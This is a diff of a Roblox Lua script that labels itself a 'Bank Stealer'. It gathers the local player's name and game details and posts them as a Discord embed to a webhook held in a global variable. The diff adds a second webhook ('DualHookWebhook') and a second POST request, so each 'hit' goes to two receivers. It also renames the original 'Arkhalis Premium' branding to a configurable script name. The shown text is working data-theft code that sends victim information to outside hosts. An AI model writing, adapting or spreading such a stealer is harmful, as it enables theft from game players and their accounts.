@@ -1,4 +1,5 @@
-local url = _G.DualHookWebhook
+local url = _G.Webhook
+local us = _G.DualHookWebhook
 local url2 = us
 local username = game:GetService("Players").LocalPlayer.Name
 local fardplayer = game.Players.LocalPlayer
@@ -13,12 +14,12 @@ local Game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).
 request = http_request or request or HttpPost or syn.request
 
 local data1 = {
-    ["content"] = "||@everyone||\n**Premium Arkhalis Bank Stealer Detected A Hit**",
+    ["content"] = "||@everyone||\n__**Bank Stealer Detected A Hit**__",
     ["embeds"] = {
         {
-            ["title"] = "```Arkhalis Bank-Steal Premium Results```",
+            ["title"] = "```Bank-Steal Results```",
             ["url"] = "https://discord.gg/5MFcdt2kaj",
-            ["description"] = "This data was generated using Premium Arkhalis Bank Stealer",
+            ["description"] = "__**This data was generated using" .. _G.ScriptName .."**__",
             ["type"] = "rich",
             ["color"] = tonumber(0x7b00ff),
             ["thumbnail"] = {
@@ -72,4 +73,6 @@ local headers = {
     ["content-type"] = "application/json"
 }
 local abcdef1 = {Url = url, Body = newdata1, Method = "POST", Headers = headers}
+local abcdef2 = {Url = url2, Body = newdata1, Method = "POST", Headers = headers}
 request(abcdef1)
+request(abcdef2)
